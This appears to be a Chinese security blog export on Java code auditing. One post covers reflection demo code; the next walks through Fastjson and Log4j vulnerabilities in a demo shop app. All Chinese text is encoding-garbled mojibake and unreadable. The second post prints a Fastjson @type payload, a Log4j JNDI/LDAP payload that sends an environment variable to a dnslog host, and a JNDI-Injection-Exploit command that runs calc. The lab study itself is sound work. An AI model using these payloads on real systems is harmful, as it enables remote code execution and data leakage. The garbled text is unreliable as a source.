åˆ©ç”¨é“¾ï¼Œè§¦å‘å‘½ä»¤æ‰§è¡Œ</p><p>ååºåˆ—åŒ–ä¸­çš„åˆ©ç”¨é“¾æ„é€ </p><p>åŠ¨æ€è·å–æˆ–æ‰§è¡Œä»»æ„ç±»ä¸­çš„å±æ€§æˆ–æ–¹æ³•</p><p>åŠ¨æ€ä»£ç†çš„åº•å±‚åŸç†æ˜¯åå°„æŠ€æœ¯</p><p>rmiååºåˆ—åŒ–ä¹Ÿæ¶‰åŠåˆ°åå°„æ“ä½œ</p><h3 id="Java-åå°„-Classå¯¹è±¡ç±»è·å–æ™®é€šç”¨æˆ·æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•åˆ›å»ºå®ä¾‹ï¼š"><a href="#Java-åå°„-Classå¯¹è±¡ç±»è·å–æ™®é€šç”¨æˆ·æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•åˆ›å»ºå®ä¾‹ï¼š" class="headerlink" title="#Java-åå°„-Classå¯¹è±¡ç±»è·å–æ™®é€šç”¨æˆ·æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•åˆ›å»ºå®ä¾‹ï¼š"></a>#Java-åå°„-Classå¯¹è±¡ç±»è·å–æ™®é€šç”¨æˆ·æˆ‘ä»¬å¯ä»¥é‡‡ç”¨ä»¥ä¸‹æ–¹æ³•åˆ›å»ºå®ä¾‹ï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person test = new Person();</span><br></pre></td></tr></table></figure><p>è€Œæˆ‘ä»¬åœ¨åˆ›å»ºclassç±»çš„å®ä¾‹å¯¹è±¡å´ä¸èƒ½ä½¿ç”¨ä¸Šè¿°æ–¹æ³•ï¼Œè¿è¡Œä¼šæŠ›å‡ºé”™è¯¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class test = new Class();</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740711965874-3170e5a0-c019-45be-9cfe-f2418045fd7b.png"></p><p>è·Ÿè¿›Classç±»çš„æºç è¿›è¡ŒæŸ¥çœ‹ï¼Œå‘ç°å…¶æ„é€ å™¨æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥åªæœ‰JVMèƒ½å¤Ÿåˆ›å»ºClasså¯¹è±¡ã€‚</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740712020504-be8d22b0-39e2-483a-926a-e5e071c26c5e.png"></p><p>å› ä¸ºClassç±»æ˜¯privateç§æœ‰å±æ€§ï¼Œæˆ‘ä»¬ä¹Ÿæ— æ³•é€šè¿‡åˆ›å»ºå¯¹è±¡çš„æ–¹å¼æ¥è·å–classå¯¹è±¡ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ€æ ·æ‰èƒ½å¤Ÿè·å–åˆ°classå¯¹è±¡å‘¢ï¼Ÿä¸€èˆ¬æˆ‘ä»¬è·å–classå¯¹è±¡å°±æœ‰ä»¥ä¸‹å‡ ç§æ–¹æ³•ï¼Œæˆ‘ä»¬æ¥é€ä¸€çœ‹çœ‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//1ã€æ ¹æ®ç±»åï¼šç±»å.class</span><br><span class="line">Class userClass =User.class;</span><br><span class="line">//2ã€æ ¹æ®å¯¹è±¡ï¼šå¯¹è±¡.getClass()</span><br><span class="line">User user =new User();</span><br><span class="line">Class aClass = user.getClass();</span><br><span class="line">//3ã€æ ¹æ®å…¨é™å®šç±»åï¼šClass.forName(&quot;å…¨è·¯å¾„ç±»å&quot;)</span><br><span class="line">Class aClass1 =Class.forName(&quot;com.example.reflectdemo.User&quot;);</span><br><span class="line">//4ã€é€šè¿‡ç±»åŠ è½½å™¨è·å¾—Classå¯¹è±¡ï¼š//ClassLoader.getSystemClassLoader().loadClass(&quot;å…¨è·¯å¾„ç±»å&quot;);</span><br><span class="line">ClassLoader clsload=ClassLoader.getSystemClassLoader();</span><br><span class="line">Class aClass2 = clsload.loadClass(&quot;com.example.reflectdemo.User&quot;);</span><br></pre></td></tr></table></figure><p>å®ç°ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">public class ReflectTemo &#123;  </span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException &#123;  </span><br><span class="line">        //1ã€ç±»çš„.classå±æ€§  </span><br><span class="line">        Class c1 = ReflectTemo.class;  </span><br><span class="line">        System.out.println(c1.getName());  </span><br><span class="line">  </span><br><span class="line">        //2ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•  </span><br><span class="line">        ReflectTemo demo = new ReflectTemo();  </span><br><span class="line">        Class c2 = demo.getClass();  </span><br><span class="line">        System.out.println(c2.getName());  </span><br><span class="line">  </span><br><span class="line">        //3ã€Class.forName(String className): åŠ¨æ€åŠ è½½ç±»  </span><br><span class="line">        Class c3 = Class.forName(&quot;org.example.ReflectTemo&quot;);  </span><br><span class="line">        System.out.println(c3.getName());  </span><br><span class="line">        //4ã€é€šè¿‡ç±»åŠ è½½å™¨è·å¾—Classå¯¹è±¡ï¼š//ClassLoader.getSystemClassLoader().loadClass(&quot;å…¨è·¯å¾„ç±»å&quot;);  </span><br><span class="line">        ClassLoader c4=ClassLoader.getSystemClassLoader();  </span><br><span class="line">        Class aClass2 = c4.loadClass(&quot;org.example.ReflectTemo&quot;);  </span><br><span class="line">        System.out.println(aClass2.getName());  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1740712758387-afa09f02-4a77-4d92-8e92-36036f0b3bf2.png"></p><h3 id="Java-åå°„-Fieldæˆå‘˜å˜é‡ç±»è·å–"><a href="#Java-åå°„-Fieldæˆå‘˜å˜é‡ç±»è·å–" class="headerlink" title="#Java-åå°„-Fieldæˆå‘˜å˜é‡ç±»è·å–"></a>#Java-åå°„-Fieldæˆå‘˜å˜é‡ç±»è·å–</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">//Class aClass = Class.forName(&quot;com.example.reflectdemo.User&quot;);</span><br><span class="line">//è·å–å…¬å…±æˆå‘˜å˜é‡å¯¹è±¡</span><br><span class="line">// Field[] fields=aClass.getFields();</span><br><span class="line">// for(Field f:fields)&#123;</span><br><span class="line">// System.out.println(f);</span><br><span class="line">// &#125; </span><br><span class="line">//è·å–æ‰€æœ‰æˆå‘˜å˜é‡å¯¹è±¡</span><br><span class="line">// Field[] fields=aClass.getDeclaredFields();</span><br><span class="line">// for(Field f:fields)&#123;</span><br><span class="line">// System.out.println(f);</span><br><span class="line">// &#125;</span><br><span class="line">//è·å–å…¬å…±ï¼Œç§æœ‰å•ä¸ªæˆå‘˜å˜é‡å¯¹è±¡</span><br><span class="line">// Field field=aClass.getField(&quot;age&quot;);</span><br><span class="line">// Field field=aClass.getDeclaredField(&quot;gender&quot;);</span><br><span class="line">// System.out.println(field);</span><br><span class="line">//åŸè¾¹å˜é‡å€¼è·å–å’Œèµ‹å€¼</span><br><span class="line">// User u = new User();</span><br><span class="line">// Field field=aClass.getField(&quot;age&quot;);</span><br><span class="line">// field.set(u,30);</span><br><span class="line">// Object a=field.get(u);</span><br><span class="line">// System.out.println(a);</span><br></pre></td></tr></table></figure><p>å®ç°ä»£ç </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">public class ReflectTemo &#123;</span><br><span class="line">    public String name;</span><br><span class="line">    public String profession;</span><br><span class="line">    protected int age;</span><br><span class="line">    private String number;</span><br><span class="line">    char sex;</span><br><span class="line">    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException &#123;</span><br><span class="line">        Class aClass = Class.forName(&quot;org.example.ReflectTemo&quot;);</span><br><span class="line">//        è·å–å…¬å…±æˆå‘˜å˜é‡å¯¹è±¡</span><br><span class="line">        Field[] fields = aClass.getFields();</span><br><span class="line">        for (Field f : fields) &#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;-------åˆ†å‰²çº¿---------&quot;);</span><br><span class="line">//        è·å–æ‰€æœ‰æˆå‘˜å˜é‡å¯¹è±¡</span><br><span class="line">        Field[] fields1 = aClass.getDeclaredFields();</span><br><span class="line">        for (Field f : fields1) &#123;</span><br><span class="line">            System.out.println(f);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(&quot;-------åˆ†å‰²çº¿---------&quot;);</span><br><span class="line">//        è·å–å…¬å…±ï¼Œç§æœ‰å•ä¸ªæˆå‘˜å˜é‡å¯¹è±¡</span><br><span class="line">        Field field = aClass.getField(&quot;name&quot;);</span><br><span class="line">        Field field1 = aClass.getDeclaredField(&quot;number&quot;);</span><br><span class="line">        System.out.println(field.getName());</span><br><span class="line">        System.out.println(field1.getName());</span><br><span class="line">        System.out.println(&quot;-------åˆ†å‰²çº¿---------&quot;);</span><br><span class="line">//        è·å–æŒ‡å®šæˆå‘˜å˜é‡</span><br><span class="line">        Field field2 = aClass.getDeclaredField(&quot;age&quot;);</span><br><span class="line">        System.out.println(field2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742375801741-d4ccab19-7084-4692-b88d-150190aee5e1.png"></p><h3 id="Java-åå°„-Methodæˆå‘˜æ–¹æ³•ç±»è·å–"><a href="#Java-åå°„-Methodæˆå‘˜æ–¹æ³•ç±»è·å–" class="headerlink" title="Java-åå°„-Methodæˆå‘˜æ–¹æ³•ç±»è·å–"></a>Java-åå°„-Methodæˆå‘˜æ–¹æ³•ç±»è·å–</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">//Class aClass = Class.forName(&quot;com.example.reflectdemo.User&quot;);</span><br><span class="line">//è¿”å›æ‰€æœ‰å…¬å…±æˆå‘˜æ–¹æ³•å¯¹è±¡çš„æ•°ç»„ï¼ŒåŒ…æ‹¬ç»§æ‰¿çš„</span><br><span class="line">// Method[] methods = aClass.getMethods();</span><br><span class="line">// for (Method me:methods)&#123;</span><br><span class="line">// System.out.println(me);</span><br><span class="line">// &#125;</span><br><span class="line">//è¿”å›æ‰€æœ‰æˆå‘˜æ–¹æ³•å¯¹è±¡çš„æ•°ç»„ï¼Œä¸åŒ…æ‹¬ç»§æ‰¿çš„</span><br><span class="line">// Method[] methods = aClass.getDeclaredMethods();</span><br><span class="line">// for (Method me:methods)&#123;</span><br><span class="line">// System.out.println(me);</span><br><span class="line">// &#125;</span><br><span class="line">//è¿”å›å•ä¸ªå…¬å…±æˆå‘˜æ–¹æ³•å¯¹è±¡</span><br><span class="line">// Method methods = aClass.getMethod(&quot;getName&quot;);</span><br><span class="line">// System.out.println(methods);</span><br><span class="line">// Method methods = aClass.getMethod(&quot;setName&quot;, String.class);</span><br><span class="line">// System.out.println(methods);</span><br><span class="line">//è¿”å›å•ä¸ªæˆå‘˜æ–¹æ³•å¯¹è±¡</span><br><span class="line">// Method methods = aClass.getDeclaredMethod(&quot;UserInfo&quot;, String.class, int.class, String.class);</span><br><span class="line">// System.out.println(methods);</span><br><span class="line">//è¿è¡Œæ–¹æ³•invoke</span><br><span class="line">// Method methods = aClass.getDeclaredMethod(&quot;UserInfo&quot;, String.class, int.class, String.class);</span><br><span class="line">// User u = new User();</span><br><span class="line">// //ç§æœ‰éœ€è¦å¼€å¯ä¸´æ—¶</span><br><span class="line">// methods.setAccessible(true);</span><br><span class="line">// methods.invoke(u,&quot;calmsec&quot;,18,&quot;man&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">public class ReflectTemo &#123;</span><br><span class="line">    public void study(String s) &#123;</span><br><span class="line">        System.out.println(&quot;å­¦ä¹ ä¸­...&quot; + s);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected void run() &#123;</span><br><span class="line">        System.out.println(&quot;è·‘æ­¥ä¸­...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    void eat() &#123;</span><br><span class="line">        System.out.println(&quot;åƒé¥­ä¸­...&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private String sleep(int age) &#123;</span><br><span class="line">        System.out.println(&quot;ç¡çœ ä¸­...&quot; + age);</span><br><span class="line">        return &quot;sleep&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class c = Class.forName(&quot;org.example.ReflectTemo&quot;); // åˆ›å»ºClasså¯¹è±¡</span><br><span class="line">            Method[] methods1 = c.getDeclaredMethods(); // è·å–æ‰€æœ‰è¯¥ç±»ä¸­çš„æ‰€æœ‰æ–¹æ³•</span><br><span class="line">            Method[] methods2 = c.getMethods(); // è·å–æ‰€æœ‰çš„publicæ–¹æ³•ï¼ŒåŒ…æ‹¬ç±»è‡ªèº«å£°æ˜çš„publicæ–¹æ³•ï¼Œçˆ¶ç±»ä¸­çš„publicæ–¹æ³•ã€å®ç°çš„æ¥å£æ–¹æ³•</span><br><span class="line"></span><br><span class="line">            for (Method m:methods1) &#123;</span><br><span class="line">                System.out.println(m);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;-------åˆ†å‰²çº¿---------&quot;);</span><br><span class="line"></span><br><span class="line">            for (Method m:methods2) &#123;</span><br><span class="line">                System.out.println(m);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            System.out.println(&quot;-------åˆ†å‰²çº¿---------&quot;);</span><br><span class="line"></span><br><span class="line">            Method methods3 = c.getMethod(&quot;study&quot;, String.class); // è·å–å…¬æœ‰æ–¹æ³•</span><br><span class="line">            System.out.println(methods3);</span><br><span class="line">            System.out.println(&quot;-------åˆ†å‰²çº¿---------&quot;);</span><br><span class="line"></span><br><span class="line">            Method method4 = c.getDeclaredMethod(&quot;sleep&quot;, int.class); // è·å–ç§æœ‰æ–¹æ³•</span><br><span class="line">            System.out.println(method4);</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742431869599-b1276c67-78bd-4aee-aef5-d8e65f36429e.png"></p><h3 id="Java-åå°„-Constructoræ„é€ æ–¹æ³•ç±»è·å–"><a href="#Java-åå°„-Constructoræ„é€ æ–¹æ³•ç±»è·å–" class="headerlink" title="#Java-åå°„-Constructoræ„é€ æ–¹æ³•ç±»è·å–"></a>#Java-åå°„-Constructoræ„é€ æ–¹æ³•ç±»è·å–</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">//Class aClass = Class.forName(&quot;com.example.reflectdemo.User&quot;);</span><br><span class="line">//è¿”å›æ‰€æœ‰å…¬å…±æ„é€ æ–¹æ³•å¯¹è±¡çš„æ•°ç»„</span><br><span class="line">// Constructor[] constructors = aClass.getConstructors();</span><br><span class="line">// for(Constructor con:constructors)&#123;</span><br><span class="line">// System.out.println(con);</span><br><span class="line">// &#125;</span><br><span class="line">//è¿”å›æ‰€æœ‰æ„é€ æ–¹æ³•å¯¹è±¡çš„æ•°ç»„</span><br><span class="line">// Constructor[] constructors = aClass.getDeclaredConstructors();</span><br><span class="line">// for(Constructor con:constructors)&#123;</span><br><span class="line">// System.out.println(con);</span><br><span class="line">// &#125;</span><br><span class="line">//è¿”å›å•ä¸ªå…¬å…±æ„é€ æ–¹æ³•å¯¹è±¡</span><br><span class="line">// Constructor con1=aClass.getConstructor();</span><br><span class="line">// Constructor con1=aClass.getConstructor(String.class);</span><br><span class="line">// System.out.println(con1);</span><br><span class="line">//è¿”å›å•ä¸ªæ„é€ æ–¹æ³•å¯¹è±¡</span><br><span class="line">// Constructor con2=aClass.getDeclaredConstructor(int.class);</span><br><span class="line">//Constructor con2=aClass.getDeclaredConstructor(String.class,int.class, String.class);</span><br><span class="line">// System.out .println(con2);</span><br><span class="line">// Constructor con2=aClass.getDeclaredConstructor(int.class);</span><br><span class="line">// con2.setAccessible(true);</span><br><span class="line">// User uu=(User) con2.newInstance(&quot;calmsec&quot;,30,&quot;man&quot;);</span><br><span class="line">// System.out.println(uu);</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">public class ReflectTemo &#123;</span><br><span class="line">    public  ReflectTemo() &#123;</span><br><span class="line">        System.out.println(&quot;æ— å‚æ„é€ å‡½æ•°&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public ReflectTemo(String name) &#123;</span><br><span class="line">        System.out.println(&quot;æœ‰å‚æ„é€ å‡½æ•°&quot; + name);</span><br><span class="line">    &#125;</span><br><span class="line">    private ReflectTemo(boolean n) &#123;</span><br><span class="line">        System.out.println(&quot;ç§æœ‰æ„é€ å‡½æ•°&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Class c1 = Class.forName(&quot;org.example.ReflectTemo&quot;);</span><br><span class="line">            Constructor[] constructors1  = c1.getDeclaredConstructors();</span><br><span class="line">            Constructor[] constructors2 = c1.getConstructors();</span><br><span class="line">            for (Constructor c : constructors1) &#123;</span><br><span class="line">                System.out.println(c);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(&quot;-------åˆ†å‰²çº¿---------&quot;);</span><br><span class="line">            for (Constructor c : constructors2) &#123;</span><br><span class="line">                System.out.println(c);</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(&quot;-------åˆ†å‰²çº¿---------&quot;);</span><br><span class="line">            Constructor constructors3 = c1.getConstructor(String.class);</span><br><span class="line">            System.out.println(constructors3);</span><br><span class="line">            System.out.println(&quot;-------åˆ†å‰²çº¿---------&quot;);</span><br><span class="line">            Constructor constructors4 = c1.getDeclaredConstructor(boolean.class);</span><br><span class="line">            System.out.println(constructors4);</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2025/png/25663185/1742436831734-e45beeca-3799-4164-870a-01be2eaf3fb1.png"></p>]]></content>
      
      
      <categories>
          
          <category> ä»£ç å®¡è®¡ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> web </tag>
            
            <tag> ååºåˆ—åŒ– </tag>
            
            <tag> å®‰å…¨ç ”ç©¶ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>javaä»£ç å®¡è®¡-å¼€å‘ç»„ä»¶</title>
      <link href="/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/"/>
      <url>/2024/11/04/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E5%BC%80%E5%8F%91%E7%BB%84%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="å¼€å‘ç»„ä»¶"><a href="#å¼€å‘ç»„ä»¶" class="headerlink" title="å¼€å‘ç»„ä»¶"></a>å¼€å‘ç»„ä»¶</h1><h2 id="ç¬¬ä¸‰æ–¹ç»„ä»¶å®‰å…¨"><a href="#ç¬¬ä¸‰æ–¹ç»„ä»¶å®‰å…¨" class="headerlink" title="ç¬¬ä¸‰æ–¹ç»„ä»¶å®‰å…¨"></a>ç¬¬ä¸‰æ–¹ç»„ä»¶å®‰å…¨</h2><p>1ã€æ‰¾å­˜åœ¨æ¼æ´çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼ˆPackageCheckeræ’ä»¶ï¼‰</p><p>2ã€æ‰¾ç»„ä»¶æ¼æ´åˆ©ç”¨å…¥å£æ¡ä»¶ï¼ˆæ ¹æ®ç½‘ä¸Šå·²çŸ¥æ¼æ´å¤ç°æ¡ä»¶ï¼‰</p><p>3ã€æ‰¾å¯æ§åœ°æ–¹è¿›è¡Œæµ‹è¯•æ£€æµ‹ï¼ˆæ ¹æ®ç½‘ä¸Šå·²çŸ¥æ¼æ´åˆ©ç”¨æ¡ä»¶ï¼‰</p><p>å¸¸è§ç¬¬ä¸‰æ–¹ç»„ä»¶æˆ–æ¡†æ¶æ¼æ´åˆ—è¡¨ï¼š</p><p>SolrShiroFastjsonJacksonLog4jSnakeYamlHessianH2database</p><p>Xsteamã€Druidã€Struts2ã€Flinkã€Flumeã€Dubboã€Redisã€Logstashã€ElasticSearchã€Kafkaã€Ghidraã€Minecraftã€Hiveã€Dataxã€Streamingã€DolphinSchedulerã€Stormã€Springç­‰ã€‚</p><p>è¿ç”¨æ’ä»¶</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719243983388-a7d78ab4-e7c9-4f17-9049-7fe0816dd5cc.png"></p><p>å‹¾é€‰</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244030199-121e5e16-585a-4bd0-88ec-8961d9a99b4c.png"></p><p>è¿™æ ·å°±ä¼šæç¤º</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244070658-c66e2614-6490-4815-810b-dba10a0d2c8f.png"></p><h3 id="Tmall-Fastjson1-2-58"><a href="#Tmall-Fastjson1-2-58" class="headerlink" title="Tmall-Fastjson1.2.58"></a>Tmall-Fastjson1.2.58</h3><p>è§¦å‘ç‚¹ï¼šJSON.parseObject() JSON.parse()</p><p>å…¨å±€æœç´¢-&gt;JSON.parseObject()-&gt;propertyJson-&gt;admin&#x2F;product</p><p>{â€œ@typeâ€:â€java.net.Inet4Addressâ€,â€valâ€:â€miyvosnszc.dgrh3.cnâ€}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244578596-1816367c-940a-4e2c-997c-1d4fa43f9241.png"></p><p>propertyJsonå¯æ§</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244596375-aa5ef740-ca3a-43ed-ba05-7a3c9945b450.png"></p><p>è®¿é—®è·¯ç”±</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244647757-9a4585ed-6ad1-4a94-bcbd-10f47640f0f6.png"></p><p>è¿™è¾¹ä¸èƒ½ä¸Šä¼ ï¼Œå†å›åˆ°adminé¡µé¢æŸ¥æ‰¾</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244690165-bc5c146e-d880-455f-af22-4b51fddd76ad.png"></p><p>éšä¾¿å¡«å¡«ä¿å­˜å†æŠ“åŒ…</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719244816852-5ac54e4a-a51f-4089-85c3-d30d7fee096b.png"></p><p>ä¿®æ”¹ç®­å¤´æŒ‡å‘éƒ¨åˆ†{â€œ@typeâ€:â€java.net.Inet4Addressâ€,â€valâ€:â€miyvosnszc.dgrh3.cnâ€}</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719245334211-3075037b-68a9-4802-b856-39a6c49003a3.png"></p><h3 id="Tmall-Log4j2-10-0"><a href="#Tmall-Log4j2-10-0" class="headerlink" title="Tmall-Log4j2.10.0"></a>Tmall-Log4j2.10.0</h3><p>è§¦å‘ç‚¹ï¼šlogger.error logger.info</p><p>å…¨å±€æœç´¢-&gt;logger.info-&gt;originalFileName-&gt;admin&#x2F;uploadAdminHeadImage</p><p>${jndi:ldap:&#x2F;&#x2F;${env:OS}.mq6bqf.dnslog.cn}</p><p>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -Câ€calcâ€</p><p>æœlogger.infoå‡½æ•°ï¼Œé‡Œé¢è¿˜è¦æœ‰å¯æ§å˜é‡</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25663185/1719246014790-96fc113c-cbd5-44d9-b91b-2af618bffb31.png"></p><p><img 